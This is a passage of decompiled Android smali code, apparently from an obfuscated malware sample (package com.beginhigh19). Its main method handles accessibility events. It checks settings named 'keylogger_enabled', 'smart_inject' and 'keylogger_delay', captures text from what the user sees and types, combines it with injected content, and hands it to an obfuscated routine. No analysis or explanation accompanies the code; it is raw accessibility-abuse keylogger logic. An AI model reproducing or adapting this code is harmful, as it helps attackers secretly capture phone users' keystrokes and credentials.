    invoke-virtual {v1}, Lfddo/fddo;->public()V

    :cond_2
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_3

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->for()V

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->super()V

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->new()V

    goto :goto_0

    :cond_3
    invoke-virtual {p0, v0}, Lcom/beginhigh19/p023w;->throw(Ljava/lang/String;)V

    :goto_0
    return-void
.end method

.method public while(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 7

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->const()V

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->final()V

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v2, "keylogger_enabled"

    invoke-static {v0, v2, v1}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    const-string v1, ""

    const-string v2, "smart_inject"

    if-nez v0, :cond_0

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-static {v0, v2, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "keylogger_delay"

    invoke-static {v0, v4, v3}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    iget-object v3, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-wide/16 v4, 0x0

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    const-string v5, "uptime"

    invoke-static {v3, v5, v4}, Lfddo/throw;->for(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Long;)Ljava/lang/Long;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    int-to-long v5, v0

    cmp-long v0, v3, v5

    if-gez v0, :cond_1

    return-void

    :cond_1
    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-static {}, Lcom/beginhigh19/p023w;->goto()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, p1, v3}, Lfddo/fddo;->native(Landroid/content/Context;Landroid/view/accessibility/AccessibilityEvent;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_2

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-static {v0, v2, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/beginhigh19/p023w;->fddo(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_2

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " "

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    :cond_2
    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-static {v0, p1}, Lfddo/goto;->rsjsadghfsfdghj(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method
